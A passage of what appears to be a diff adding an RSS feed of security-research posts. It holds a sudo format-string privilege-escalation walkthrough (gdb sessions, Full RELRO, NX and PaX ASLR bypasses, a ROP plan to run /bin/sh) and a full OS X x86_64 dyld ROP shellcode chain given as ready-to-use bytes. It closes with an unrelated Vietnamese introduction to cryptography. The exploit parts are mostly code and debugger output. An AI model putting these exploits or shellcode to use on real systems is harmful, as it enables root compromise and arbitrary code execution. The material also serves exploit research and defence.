+#6  0x400d566b in buffered_vfprintf (s=0x40234920, format=&lt;optimized out&gt;, args=&lt;optimized out&gt;) at vfprintf.c:2207
+#7  0x400d0cad in _IO_vfprintf_internal (s=0x40234920, format=0x4023b958 "%*123$ %*456$ %1073741824$: settings: %s=%sn", ap=0xbff42b78  &lt;incomplete sequence 340&gt;) at vfprintf.c:1256
+#8  0x401958a1 in ___vfprintf_chk (fp=0x40234920, flag=0x1, format=0x4023b958 "%*123$ %*456$ %1073741824$: settings: %s=%sn", ap=0xbff42b78  &lt;incomplete sequence 340&gt;) at vfprintf_chk.c:35
+#9  0x400094a0 in vfprintf (__ap=0xbff42b78  &lt;incomplete sequence 340&gt;, __fmt=&lt;optimized out&gt;, __stream=&lt;optimized out&gt;) at /usr/include/bits/stdio2.h:128
+#10 sudo_debug (level=0x9, fmt=0x4000dff3 "settings: %s=%s") at ./sudo.c:1202
+#11 0x400082cd in parse_args (argc=0x1, argv=0x4023b730, nargc=0xbff42d20, nargv=0xbff42d24, settingsp=0xbff42d28, env_addp=0xbff42d2c) at ./parse_args.c:413
+#12 0x40002890 in main (argc=0x2, argv=0xbff42df4, envp=0xbff42e00) at ./sudo.c:203
+
+gdb$ list vfprintf.c:1688
+1683	    /* Fill in the types of all the arguments.  */
+1684	    for (cnt = 0; cnt &lt; nspecs; ++cnt)
+1685	      {
+1686		/* If the width is determined by an argument this is an int.  */
+1687		if (specs[cnt].width_arg != -1)
+1688		  args_type[specs[cnt].width_arg] = PA_INT;
+1689
+1690		/* If the precision is determined by an argument this is an int.  */
+1691		if (specs[cnt].prec_arg != -1)
+1692		  args_type[specs[cnt].prec_arg] = PA_INT;
+gdb$ break vfprintf.c:1688
+Breakpoint 1 at 0x400d1c5b: file vfprintf.c, line 1688.
+
+gdb$ run
+process 2157 is executing new program: /usr/bin/sudo
+   0x400d1c53 &lt;_IO_vfprintf_internal+4531&gt;:	mov    eax,DWORD PTR [edi+0x20]
+   0x400d1c56 &lt;_IO_vfprintf_internal+4534&gt;:	cmp    eax,0xffffffff
+   0x400d1c59 &lt;_IO_vfprintf_internal+4537&gt;:	je     0x400d1c68 &lt;_IO_vfprintf_internal+4552&gt;
+=&gt; 0x400d1c5b &lt;_IO_vfprintf_internal+4539&gt;:	mov    edx,DWORD PTR [ebp-0x484]
+   0x400d1c61 &lt;_IO_vfprintf_internal+4545&gt;:	mov    DWORD PTR [edx+eax*4],0x0
+   0x400d1c68 &lt;_IO_vfprintf_internal+4552&gt;:	mov    eax,DWORD PTR [edi+0x1c]
+   0x400d1c6b &lt;_IO_vfprintf_internal+4555&gt;:	cmp    eax,0xffffffff
+   0x400d1c6e &lt;_IO_vfprintf_internal+4558&gt;:	je     0x400d1c7d &lt;_IO_vfprintf_internal+4573&gt;
+
+Breakpoint 1, _IO_vfprintf_internal (s=0xbfe48748, format=&lt;optimized out&gt;, ap=0xbfe48e28  &lt;incomplete sequence 340&gt;) at vfprintf.c:1688
+1688		  args_type[specs[cnt].width_arg] = PA_INT;
+
+gdb$ p &amp;s-&gt;_flags2
+$1 = (_IO_FILE **) 0xbf845310
+gdb$ p/d (char*)&amp;s-&gt;_flags2 - *(int)($ebp-0x484)
+$2 = 11396
+
+gdb$ p &amp;nargs
+$3 = (size_t *) 0xbf844e74
+gdb$ p/d (char*)&amp;nargs - *(int)($ebp-0x484)
+$4 = 1924
+</pre>
+
+<p><em>s-&gt;_flags2</em> and <em>nargs</em> is on stack with fixed relative offsets to current stack pointer, so we can adjust offsets according to relative stack addresses to fulfill #2 &amp; #3. Let do this again and calculate correct values when we have final format string for the exploit.</p>
+
+<h3 id="bypassing-full-relro">Bypassing Full RELRO</h3>
+
+<p>We can now use “%n” primitive to write anywhere with any value, but where to write to? sudo binary is compiled with Full RELRO, this means we cannot write to GOT entry or dynamic-&gt;.fini to redirect the execution as they are read-only. The idea here is simple: we try to overwrite function pointer in libc or ld-linux and hope it will be called later in program to trigger redirection. This works smoothly with sudo case.</p>
+
+<pre class="brush: plain; title: ; notranslate" title=""># ln -s /usr/bin/sudo ./%x
+# ulimit -s unlimited
+# gdb -q ./%x
+gdb$ list sudo.c:204
+199	    memset(&amp;user_details, 0, sizeof(user_details));
+200	    user_info = get_user_info(&amp;user_details);
+201
+202	    /* Parse command line arguments. */
+203	    sudo_mode = parse_args(argc, argv, &amp;nargc, &amp;nargv, &amp;settings, &amp;env_add);
+204	    sudo_debug(9, "sudo_mode %d", sudo_mode);
+205
+206	    /* Print sudo version early, in case of plugin init failure. */
+207	    if (ISSET(sudo_mode, MODE_VERSION)) {
+208		printf("Sudo version %sn", PACKAGE_VERSION);
+
+gdb$ break sudo.c:207
+gdb$ run -D9
+4000e036: settings: 9=en_US.UTF-8
+4000e0bc: settings: %x=en_US.UTF-8
+4000e0c5: settings: true=en_US.UTF-8
+4000e0fc: settings: 10.0.2.15/255.255.255.0 fe80::a00:27ff:fe9e:e68c/ffff:ffff:ffff:ffff::=en_US.UTF-8
+a0001: sudo_mode -1078177084
+Breakpoint 1, main (argc=0x2, argv=0xbfbc5394, envp=0xbfbc53a0) at ./sudo.c:207
+207	    if (ISSET(sudo_mode, MODE_VERSION)) {
+
+gdb$ vmmap libc
+Start	End	Perm	Name
+0x400a8000 0x4024d000 r-xp /lib/libc-2.14.90.so
+0x4024d000 0x4024f000 r--p /lib/libc-2.14.90.so
+0x4024f000 0x40250000 rw-p /lib/libc-2.14.90.so
+gdb$ x/8wx 0x4024f000
+0x4024f000:	0x401da990	0x40122490	0x40121e10	0x401227a0
+0x4024f010:	0x4013fc60	0x40122fb0	0x40027f20	0x401223e0
+gdb$ x/8i 0x40121e10
+0x40121e10 &lt;__GI___libc_malloc&gt;:	sub    esp,0x3c
+0x40121e13 &lt;__GI___libc_malloc+3&gt;:	mov    DWORD PTR [esp+0x2c],ebx
+0x40121e17 &lt;__GI___libc_malloc+7&gt;:	call   0x401db813 &lt;__i686.get_pc_thunk.bx&gt;
+0x40121e1c &lt;__GI___libc_malloc+12&gt;:	add    ebx,0x12d1d8
+0x40121e22 &lt;__GI___libc_malloc+18&gt;:	mov    DWORD PTR [esp+0x30],esi
+0x40121e26 &lt;__GI___libc_malloc+22&gt;:	mov    esi,DWORD PTR [esp+0x40]
+0x40121e2a &lt;__GI___libc_malloc+26&gt;:	mov    DWORD PTR [esp+0x34],edi
+0x40121e2e &lt;__GI___libc_malloc+30&gt;:	mov    DWORD PTR [esp+0x38],ebp
+
+gdb$ set *0x4024f008=0x41414141
+gdb$ continue
+Program received signal SIGSEGV, Segmentation fault.
+0x400bee20 &lt;realloc@plt+0&gt;:	jmp    DWORD PTR [ebx+0x10]
+0x400bee26 &lt;realloc@plt+6&gt;:	push   0x8
+0x400bee2b &lt;realloc@plt+11&gt;:	jmp    0x400bee00
+=&gt; 0x400bee30 &lt;malloc@plt+0&gt;:	jmp    DWORD PTR [ebx+0x14]
+0x400bee36 &lt;malloc@plt+6&gt;:	push   0x10
+0x400bee3b &lt;malloc@plt+11&gt;:	jmp    0x400bee00
+0x400bee40 &lt;memalign@plt+0&gt;:	jmp    DWORD PTR [ebx+0x18]
+0x400bee46 &lt;memalign@plt+6&gt;:	push   0x18
+0x400bee30 in malloc@plt () from /lib/libc.so.6
+gdb$ x/x $ebx+0x14
+0x4024f008:	0x41414141
+</pre>
+
+<h3 id="bypassing-nx">Bypassing NX</h3>
+
+<p>The last part of our exploit is bypassing NX and this can be done via libc ROP gadgets as its address now is fixed. We spray the environment with target payload and use a stack pivot gadget <em>(add esp, 0xNNN)</em> to jump to it. Out payload will look like:</p>
+
+<pre>[ ROP NOPs | setuid, execve, 0, &amp;/bin/sh, nullptr, nullptr ]</pre>
+
+<p>Or we can use another simple version to avoid NULL byte:</p>
+
+<pre>[ ROP NOPs | execve, exit, &amp;./custom_shell, nullptr, nullptr ]</pre>
+
+<p>Where <em>“./custom_shell”</em> is an available string in libc (e.g: “./0123456789:;&lt;=&gt;?”)</p>
+
+<h3 id="exploit-code">Exploit code</h3>
+
+<p>To not spoil the fun of people who may want to try it, I will post it later <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> </p>
+
+<h2 id="further-notes">Further notes</h2>
+
+<h3 id="fortifysource-on-x86x64">FORTIFY_SOURCE on x86_x64</h3>
+
+<p>The technique we use here to bypass FORTIFY_SOURCE failed work on x86_64 as we can not find a *nargs *value (32-bit) that satisfies: (nargs * 4) is truncated to a small 64-bit value. I hope someone will find new ways to bypass it on x86_64.</p>
+
+<h3 id="reliability-of-exploit">Reliability of exploit</h3>
+
+<p>Though we disable ASLR, stack address is not affected and sometimes there is a gap between current stack pointer and our payload in environment and we may fail to perform stack pivoting. In order to achieve reliability, we have to spray the environment carefully. <em>Update: 65K environment is enough for 100% reliability on Fedora (thanks to brainsmoke)</em></p>
+
+<h2 id="span-stylecolor-ff0000updatespan-exploit-on-grsecuritypax-enabled-kernel"><span style="color: #ff0000">Update:</span> exploit on grsecurity/PaX-enabled kernel</h2>
+
+<p>Our exploit on Fedora16 with vanilla kernel relies on a single address: libc base address. With PaX’s ASLR implementation we have to bruteforce for 20-bits and this is definitely hard with proper ASLR. Though “ulimit -s unlimited” has no real effect on grsecurity/PaX-enabled kernel, it can help to reduce 4-bits entropy of library addresses. 16-bits bruteforcing still requires average 32K+ runs and is hopeless with grsecurity’s bruteforce deterring (15 minutes locked out of system for a failed try).</p>
+
+<p>We had to re-work to make our exploit has a chance to win ASLR. Obviously, we cannot pick any address of library or binary to overwrite, the only way now is to overwrite available addresses on stack. *Fortunately*, we can overwrite saved EIP of sudo_debug() directly as there is pointers to it on stack. Following GDB session shows that:</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">gdb$ backtrace
+#0  sudo_debug (level=0x9, fmt=0xb772c013 "settings: %s=%s") at ./sudo.c:1192
+#1  0xb77262ed in parse_args (argc=0x1, argv=0xb7734dc8, nargc=0xbfffe720, nargv=0xbfffe724, settingsp=0xbfffe728, env_addp=0xbfffe72c) at ./parse_args.c:413
+#2  0xb77208b0 in main (argc=0x2, argv=0xbfffe7f4, envp=0xbfffe800) at ./sudo.c:203
+gdb$ pref 0xb77262ed
+Found 5 results:
+0xbfffe030 --&gt; 0xbfffe56c --&gt; 0xb77262ed (0xb77262ed &lt;parse_args+1837&gt;:	mov    eax,DWORD PTR [esp+0x2c])
+0xbfffe060 --&gt; 0xbfffe56c --&gt; 0xb77262ed (0xb77262ed &lt;parse_args+1837&gt;:	mov    eax,DWORD PTR [esp+0x2c])
+0xbfffe0c0 --&gt; 0xbfffe56c --&gt; 0xb77262ed (0xb77262ed &lt;parse_args+1837&gt;:	mov    eax,DWORD PTR [esp+0x2c])
+0xbfffe0f0 --&gt; 0xbfffe56c --&gt; 0xb77262ed (0xb77262ed &lt;parse_args+1837&gt;:	mov    eax,DWORD PTR [esp+0x2c])
+0xbfffe2a0 --&gt; 0xbfffe56c --&gt; 0xb77262ed (0xb77262ed &lt;parse_args+1837&gt;:	mov    eax,DWORD PTR [esp+0x2c])
+</pre>
+
+<p>By chosing to return to near by function inside sudo binary (e.g my_execve()), we can effectively reduce the entropy down to 4-bits with a short write (%hn):</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">gdb$ run
+gdb$ p my_execve
+$1 = {int (const char *, char * const *, char * const *)} 0xb7721fe0 &lt;my_execve&gt;
+
+gdb$ run
+gdb$ p my_execve
+$2 = {int (const char *, char * const *, char * const *)} 0xb7726fe0 &lt;my_execve&gt;
+</pre>
+
+<p>This is a quite good improvement, even on PaX-enabled kernel we only need few tries to get a root shell. But with grsecurity’s bruteforce deterring, I don’t know how long it will take (maybe days) as I failed to get a shell after a day. Though we have a good exploit against real ASLR, it is still far from ideal “one-shot exploit”. One-shot exploit can only be done if we are able to leak the library/binary address then (ab)use it on the fly.</p>
+
+<p>In TODO part of Phrack 67 article, the author mentioned that he could not stabilize the use of copy (read+write) primitive when abusing printf(). I decided to reproduce his experiment under a new condition: stack limit is lifted with “ulimit -s unlimited”. After hundred of tries for different offsets, we can stabilize the copy, which means we successfully leak the address and abuse it on the fly. Hunting for address on stack is easy now, we can choose to pick saved EIP of sudo_debug itself or any address of libc available on stack (e.g from __vfprintf_internal function). Then we calculate the offset from there to an exec() function, copy (read+write) it to overwrite saved EIP of sudo_debug() with a format string looks like “%*123$x %456x %789$n”. By repeating the write step, we are able to create custom arguments on stack to prepare for a valid execution via exec() and achieve a one-shot pwn.</p>
+
+<h3 id="notes">Notes</h3>
+
+<ul>
+  <li>We rarely find pointer to save EIP of functions on stack for direct overwrite like this case</li>
+  <li>Direct parameter access is 12-bytes each unlike 4-bytes each in normal format string exploit. This will limit your ability to write to arbitrary pointer on stack.</li>
+  <li>Copy primitive uses unsigned value, so if library/binary base is mapped at high address (e.g 0xb7NNNNNN) we will fail to leak the address on the fly (it is still an open problem, hope someone can find out). With PaX’s ASLR, we are in luck as it maps library/binary start at something like 0x2NNNNNNN in the effect of “ulimit -s unlimited” (so it actually has effect :)).</li>
+</ul>
+
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>Yet another universal OSX x86_64 dyld ROP shellcode</title>
+  <link>http://realjenius.com/research/2011/07/30/yet-another-universal-osx-x86_64-dyld-rop-shellcode.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2011-07-30T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/research/2011/07/30/yet-another-universal-osx-x86_64-dyld-rop-shellcode.html</guid>
+  <description><![CDATA[
+     <p>This technique was killed by OSX Lion 10.7 with full ASLR. @pa_kt has posted an <a href="http://gdtr.wordpress.com/2011/07/23/universal-rop-shellcode-for-os-x-x64/">Universal ROP shellcode for OS X x64</a> with detail steps and explanation. If you don’t have a chance to read above post, the basic ideas are:</p>
+
+<ul>
+  <li>Copy stubcode to a writable area (.data section)</li>
+  <li>Make that area RWX</li>
+  <li>Jump to RWX area and execute stubcode</li>
+  <li>Stubcode will transfer normal shellcode to RWX area and execute it</li>
+  <li>All the ROP gadgets are from dyld module which is not randomized</li>
+</ul>
+
+<p>In this post, we shows another OSX x86_64 dyld ROP shellcode which is more simple. We employ the same ideas with some minor differences in implementation:</p>
+
+<ul>
+  <li>Instead of using long gadgets with “leave”, we use direct, short gadgets from unintended code</li>
+  <li>Calling mprotect() via syscall</li>
+  <li>Short stubcode (7 bytes) using memcpy() to transfer payload</li>
+</ul>
+
+<p>Here is the ROP shellcode with explanation:</p>
+
+<pre class="brush: plain; title: ; notranslate" title=""># store [target], stubcode
+0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
+0xc353575e545a5b90 # =&gt; rsi = stubcode
+0x00007fff5fc24cdc # pop rdi
+0x00007fff5fc74f80 # =&gt; rdi
+0x00007fff5fc24d26 # mov [rdi+0x80] rsi; stubcode =&gt; [target]
+# load rdx, 0x7 (prot RWX)
+0x00007fff5fc24cdc # pop rdi
+0x00007fff5fc75001 # =&gt; rdi
+0x00007fff5fc1ddc0 # lea rax, [rdi-0x1]
+0x00007fff5fc219c3 # pop rbp ; add [rax] al ; add cl cl
+0x00007fff5fc75000 # =&gt; rbp
+0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
+0x0000000000000007 # =&gt; rsi
+0x00007fff5fc14149 # mov edx esi ; add [rax] al ; add [rbp+0x39] cl =&gt; rdx = 0x7
+# load rsi, 4096 (size)
+0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
+0x0000000000001000 # =&gt; rsi = 4096
+# load rax, mprotect_syscal
+0x00007fff5fc24cdc # pop rdi
+0x000000000200004b # =&gt; rdi
+0x00007fff5fc1ddc0 # lea rax, [rdi-0x1] =&gt; rax = 0x200004a (mprotect syscall)
+# load rdi, target
+0x00007fff5fc24cdc # pop rdi
+0x00007fff5fc75000 # =&gt; rdi = target
+# syscall
+0x00007fff5fc1c76d # mov r10, rcx; syscall  =&gt; mprotect(target, 4096, 7)
+0x00007fff5fc75000 # jump to target, execute stubcode
+# stubcode
+# 5B                pop rbx     # rbx -&gt; memcpy()
+# 5A                pop rdx     # rdx -&gt; size
+# 54                push rsp    # src -&gt; &amp;shellcode
+# 5E                pop rsi     # src -&gt; &amp;shellcode
+# 57                push rdi    # jump to target when return from memcpy()
+# 53                push rbx    # memcpy()
+# C3                ret         # execute memcpy(target, &amp;shellcode, size)
+0x00007fff5fc234f0 # &amp;memcpy()
+0x0000000000000200 # shellcode size = 512
+&lt;your shellcode here&gt;
+</pre>
+
+<p>You can verify those gadgets and find more here: <a href="http://goo.gl/p35vY">http://goo.gl/p35vY</a></p>
+
+<p>Ready to use shellcode:</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">"xeexe7xc0x5fxffx7fx00x00x90x5bx5ax54x5ex57x53xc3"
+"xdcx4cxc2x5fxffx7fx00x00x80x4fxc7x5fxffx7fx00x00"
+"x26x4dxc2x5fxffx7fx00x00xdcx4cxc2x5fxffx7fx00x00"
+"x01x50xc7x5fxffx7fx00x00xc0xddxc1x5fxffx7fx00x00"
+"xc3x19xc2x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
+"xeexe7xc0x5fxffx7fx00x00x07x00x00x00x00x00x00x00"
+"x49x41xc1x5fxffx7fx00x00xeexe7xc0x5fxffx7fx00x00"
+"x00x10x00x00x00x00x00x00xdcx4cxc2x5fxffx7fx00x00"
+"x4bx00x00x02x00x00x00x00xc0xddxc1x5fxffx7fx00x00"
+"xdcx4cxc2x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
+"x6dxc7xc1x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
+"xf0x34xc2x5fxffx7fx00x00x00x02x00x00x00x00x00x00"
+</pre>
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>Mật mã hiện đại (1)</title>
+  <link>http://realjenius.com/research/2011/01/14/crypto-1.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2011-01-14T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/research/2011/01/14/crypto-1.html</guid>
+  <description><![CDATA[
+     <p>Tôi dự tính viết về đề tài này từ cả năm nay, mà mãi tới bây giờ mới có đủ động lực để viết. Có hai lý do khiến tôi bắt đầu.</p>
+
+<p>Thứ nhất, số là tôi đang theo học một cách chính quy về mật mã, mà kinh nghiệm cho thấy cách học (và đọc sách) tốt nhất là viết, tóm tắt lại và giải thích rành mạch rõ ràng những gì vừa học được cho người khác. Chừng nào làm được như thế thì mới có thể xem là đã hiểu được vấn đề đang muốn học.</p>
+
+<p>Thứ hai, hôm rồi tôi đọc một mẩu chuyện về Richard Feynman, trong đó có đoạn kể về lúc Feynman bị bệnh, gần đất xa trời, ông tâm sự rằng, “[I’m going to die but I’m not as sad as you think because] when you get as old as I am, you start to realize that <a href="http://www.longnow.org/essays/richard-feynman-connection-machine/">you’ve told most of the good stuff you know to other people anyway</a>“. Đương nhiên những gì tôi biết làm sao mà “good” bằng những gì Feynman biết, nhưng dẫu sao thì tôi cũng sẽ học theo Feynman, có biết cái gì hay ho thì giải thích cho nhiều người khác cùng biết.</p>
+
+<h2 id="i-m-u">I. Mở đầu</h2>
+
+<h3 id="gii-thiu">1. Giới thiệu</h3>
+
+<p>Loạt bài này tôi sẽ giới thiệu về mật mã học hiện đại, tập trung vào giải thích cách thức hoạt động của các thành phần mật mã cơ sở (cryptographic primitive) và làm sao sử dụng chúng cho đúng cách.</p>
+
+<p>Mật mã là công cụ rất mạnh mẽ làm nhiều người lầm tưởng rằng cứ sử dụng mật mã là an toàn, mà không biết rằng mật mã là con dao hai lưỡi. Bạn có thể xây dựng một hệ thống với đầy đủ các ý tưởng hay ho nhất của mật mã, nhưng nếu bạn không dùng mật mã đúng cách, hệ thống của bạn sẽ hoàn toàn thiếu an toàn.</p>
+
+<p>Đã có rất nhiều ví dụ, mà tiêu biểu là các kết quả làm việc gần đây của tôi và đồng nghiệp (xem <a href="http://vnhacker.blogspot.com/2009/09/flickrs-api-signature-forgery.html">đây</a>, <a href="http://vnhacker.blogspot.com/2010/06/practical-padding-oracle-attacks.html">đây</a> và <a href="http://vnhacker.blogspot.com/2010/10/first-time-on-screen.html">đây</a>). Hoặc như gần đây, hệ thống bảo vệ máy PS3 của Sony bị phá vỡ hoàn toàn chỉ vì sử dụng sai mật mã. Không riêng gì Sony, mà rất nhiều hãng lớn trên thế giới, từ Oracle, Yahoo!, đến Microsoft, đã sử dụng sai mật mã và làm cho sản phẩm của họ thiếu an toàn.</p>
+
+<p>Điều này cho thấy, chỉ biết mật mã giúp gì cho bạn là chưa đủ, mà bạn cần phải biết làm thế nào để sử dụng chúng đúng cách. Khi biết cách sử dụng đúng mật mã rồi, bạn sẽ có thể dùng mật mã để xây dựng các hệ thống an toàn hơn, và đồng thời có thể đánh giá được sản phẩm sử dụng mật mã của bên thứ ba.</p>
+
+<p>Giáo trình mà tôi sử dụng là cuốn sách “<a href="http://www.amazon.com/Introduction-Modern-Cryptography-Principles-Protocols/dp/1584885513">Introduction To Modern Cryptography</a>” của Jonathan Katz và Yehuda Lindell (từ đây về sau gọi là KL). Trong quá trình học mật mã, tôi cũng đã đọc thử nhiều sách khác nhau, nhưng cuốn KL này là thích hợp hơn nhất cho việc tìm hiểu mật mã học hiện đại. KL cũng được sử dụng làm giáo trình để dạy mật mã cho cấp đại học và cao học ở nhiều trường đại học trên thế giới. Bạn nào có điều kiện thì nên mua sách. Nếu là sinh viên thì có thể liên hệ với tôi (ở TP.HCM) để mượn sách mà đọc.</p>
+
+<p>Một cuốn sách miễn phí khác có thể dùng để thay thế KL là cuốn Handbook of Applied Cryptography. Kết thúc mỗi bài viết, tôi sẽ liệt kê trang nào trong KL hoặc HAC cần phải đọc.</p>
+
+<p>Loạt bài được chia làm ba phần lớn. Phần đầu tiên nói về mã đối xứng, phần thứ hai nói về mã bất đối xứng, và phần thứ ba sẽ bàn về các đề tài nâng cao. Trong phần thứ nhất tôi sẽ giải quyết vấn đề: làm thế nào để chị A và anh B liên lạc với nhau an toàn, khi hai người đã có một khóa bí mật chung? Vấn đề của phần thứ hai sẽ là làm thế nào để chị A và anh B chưa quen biết nhau có thể tạo ra một khóa bí mật chung chỉ có hai anh chị biết mà thôi? Trong phần thứ ba, tùy vào tình hình mà tôi sẽ viết về các đề tài như tiền điện tử, bầu cử điện tử hay đấu giá điện tử.</p>
+
+<p>Tôi cũng muốn lưu ý là nội dung loạt bài sẽ có những phần không nằm trong cuốn KL, và tôi sẽ cố gắng để người đọc hiểu được loạt bài này mà không cần phải tham khảo thêm tài liệu khác. Nghĩa là khi nào cần thì tôi sẽ cung cấp các kiến thức hỗ trợ, ví dụ như các kiến thức toán (bao gồm lý thuyết xác suất, lý thuyết số, đại số trừu tượng và một ít lý thuyết độ phức tạp tính toán). Tôi cũng không chắc là tôi làm được (tự vì tôi cũng đang học như bạn mà thôi!), nhưng mà tôi sẽ cố gắng. Mục tiêu của tôi là nếu bạn theo sát loạt bài viết này từ đầu, thì khi kết thúc, bạn sẽ hiểu mật mã học hiện đại hoạt động ra sao, và cách sử dụng chúng như thế nào cho đúng và an toàn.</p>
+
+<h3 id="ti-sao-mt-m">2. Tại sao mật mã?</h3>
+
+<p>Trước khi đi vào nội dung chính của bài viết đầu tiên, tôi muốn dành ra ít phút để thuyết phục bạn là tại sao chúng ta cần phải học mật mã. Cá nhân tôi thấy có ba lý do chính.</p>
+
+<p>Thứ nhất, mật mã là công cụ rất quan trọng, được sử dụng ở mọi nơi. Tôi đồ rằng nhiều bạn dùng mật mã hàng ngày mà lại không biết. Bạn có dùng GMail hoặc có bao giờ mua hàng trên Amazon không? Nếu có thì bạn đã dùng mật mã rồi đó.</p>
+
+<p>Bạn có chú ý là khi bạn vào GMail hoặc Amazon, địa chỉ mà bạn sử dụng bắt đầu bằng HTTPS thay vì HTTP không? Chữ S trong HTTPS là viết tắt của Secure, hiểu nôm na rằng HTTPS là phiên bản an toàn hơn so với HTTP, và sự an toàn này là nhờ vào bộ giao thức mật mã mang tên Secure Socket Layer, phiên bản mới hơn gọi là Transport Layer Security. Nhờ có SSL/TLS mà bạn có thể an tâm giao dịch với Amazon mà không sợ thông tin giao dịch của bạn bị đánh cắp hoặc chỉnh sửa trong quá trình truyền từ máy tính của bạn lên đến máy chủ của Amazon. Nói cách khác, không có mật mã thì đã không có thương mại điện tử rồi!</p>
+
+<p>SSL/TLS được dùng chủ yếu để bảo vệ thế giới web, mà Internet thì đâu chỉ có web. Mật mã còn có thể được sử dụng để đảm bảo an toàn cho email. Email có hai vấn đề cần phải giải quyết. Thứ nhất, làm thế nào để đảm bảo tính riêng tư, tỉ như chị A viết thư cho anh B, thì chỉ có anh B đọc được thư đó thôi, không ai khác đọc được cả. Thứ hai, làm thế nào để hiện thực hóa vấn đề chữ ký trong thư từ thông thường, nói cách khác làm sao để anh B biết chắc là thư đang đọc đến từ chị A, không bị ai sửa chữa giả mạo gì cả, và sau này chị A cũng không thể chối là chị không phải là tác giả của lá thư đó? Đây chính là yêu cầu bắt buộc của khái niệm chữ ký điện tử mà chúng ta thường nghe. Tương tự như SSL/TLS, PGP/OpenPGP là tiêu chuẩn phổ biến nhất để bảo vệ email thông qua các thành tựu của mật mã học.</p>
+
+<p>Nếu bạn là lập trình viên, thì chắc chắn sẽ có lúc nào đó bạn gặp phải vấn đề xác thực người dùng, và lúc đó bạn sẽ cần phải sử dụng mật mã để xây dựng nên một cơ chế quản lý mật khẩu và xác thực người dùng một cách an toàn. Thay vì lưu mật mã trực tiếp xuống cơ sở dữ liệu, nhiều lập trình viên đã biết sử dụng các thuật toán băm một chiều để bảo vệ mật khẩu. Tuy vậy phần lớn trong số đó vẫn sử dụng sai mật mã, khiến cho mặc dù có dùng mật mã, nhưng hệ thống của họ vẫn không an toàn hơn là mấy. Thí dụ như nếu bạn chỉ băm mật khẩu xuyên qua MD5 một lần, thì bạn đã làm sai! Cách làm đúng là phải băm ít nhất 1000 lần, và còn nhiều tiểu tiết khác nữa!</p>
+
+<p>Người ta còn dùng mật mã để bảo vệ các giao thức mạng không dây. Thầy tôi thường nói ông phải cảm ơn những người đã thiết kế ra tiêu chuẩn 802.11i, còn được biết đến là WEP, bởi WEP đã phạm phải mọi sai lầm từng được biết đến trong các sách giáo khoa về mật mã, nên mỗi lần cần đưa ra ví dụ về cách sử dụng sai mật mã, thầy tôi chỉ việc lấy một ví dụ từ WEP! Ông gọi WEP là một giao thức được “thiết kế sau những cánh cửa đóng”, đi ngược lại hoàn toàn với tiêu chí mở trong mã hóa (tôi sẽ nói thêm về tiêu chí mở này ở bên dưới). Trong loạt bài này, bạn sẽ thấy ngoài WEP ra còn có rất nhiều giao thức, thuật toán mã hóa được “thiết kế sau những cánh cửa đóng”, và tất cả đều không an toàn.</p>
+
+<p>Ngoài những ứng dụng trực tiếp kể trên ra, mật mã còn được sử dụng trong nhiều lĩnh vực có vẻ không liên quan mấy, ví dụ như bầu cử, đấu giá, tiền điện tử hay bảo vệ bản quyền điện tử. Đây là những chủ đề mà bản thân tôi chưa có cơ hội tìm hiểu; dẫu vậy tôi có kế hoạch sẽ tìm hiểu chúng trong tương lai gần. Tóm lại, lý do thứ nhất cần phải học mật mã là vì mật mã rất mạnh mẽ và có thể giúp chúng ta giải quyết nhiều vấn đề tự nhiên đến từ cuộc sống.</p>
+
+<p>Thứ hai, mật mã rất đẹp, đơn giản vì nó là sự giao thoa và ứng dụng của rất nhiều nhánh trong toán học, mà toán đẹp cỡ nào thì khỏi phải bàn rồi phải không? ;-).</p>
+
+<p><a href="http://tuanvanle.wordpress.com/2010/12/16/%E1%BB%A9ng-d%E1%BB%A5ng-toan-h%E1%BB%8Dc-%E2%80%93-%E2%80%9Cm%E1%BA%A3nh-d%E1%BA%A5t-h%E1%BB%A9a%E2%80%9D-d%E1%BA%A7y-chong-gai/">Giáo sư Phạm Huy Điển từng viết rất hay như thế này</a>:</p>
+
+<blockquote>
+  <p>Lâu nay không ít người cảm thấy thất vọng vì đã “uổng công” học Toán. Nghe người ta nói thì Toán học là “chìa khóa” cho mọi vấn đề, nhưng trên thực tế thì học sinh sau khi tốt nghiệp lại chẳng biết dùng kiến thức Toán đã học được trong nhà trường vào việc gì trong cuộc sống, nhất là những bài toán khó mà họ đã tốn bao công sức nhồi nhét trong các “lò luyện” đủ loại. Đây là một thực tế, xuất phát từ việc xác định nội dung và phương pháp dạy Toán không hợp lý trong các nhà trường hiện nay. Toán học đã bị biến thành một môn “đánh đố thuần túy”, thay vì một bộ môn khoa học mang đầy chất thực tiễn. Tuy nhiên, còn một lý do khác khiến chúng ta không nhìn thấy được bóng dáng của Toán học trong thực tiễn thường ngày, đó là Toán học ngày nay không mấy khi trực tiếp đi được vào các ứng dụng trong thực tiễn mà thường phải “ẩn” sau các ngành khoa học khác: Sinh học, Môi trường, Tài chính, Kinh tế… và thậm chí ngay cả Công nghệ thông tin, một lĩnh vực có thể xem như là được sinh ra từ Toán học. Đã có những ý kiến nói về sự lãng phí của nguồn nhân lực đang làm Toán hiện nay và không ít người cũng đã tưởng là thật…</p>
+
+  <p>May mắn thay, khoa học Mật mã đã góp một phần quan trọng trong việc làm sáng tỏ cái “sự thật oan trái” này. Có thể nói rằng hiếm có lĩnh vực nào mà vai trò của các công cụ Toán học lại được thể hiện rõ ràng đến như vậy. Chính Toán học đã làm nên cuộc cách mạng trong công nghệ mật mã, trước hết là bằng sự hiện thực hóa các ý tưởng về mật mã khóa công khai mà các nhà mật mã chuyên nghiệp đã ấp ủ từ lâu, và sau đó là đưa một số kết quả của Toán học (thuộc loại trừu tượng vào bậc nhất) tiếp cận với các ứng dụng trong thực tiễn.</p>
+</blockquote>
+
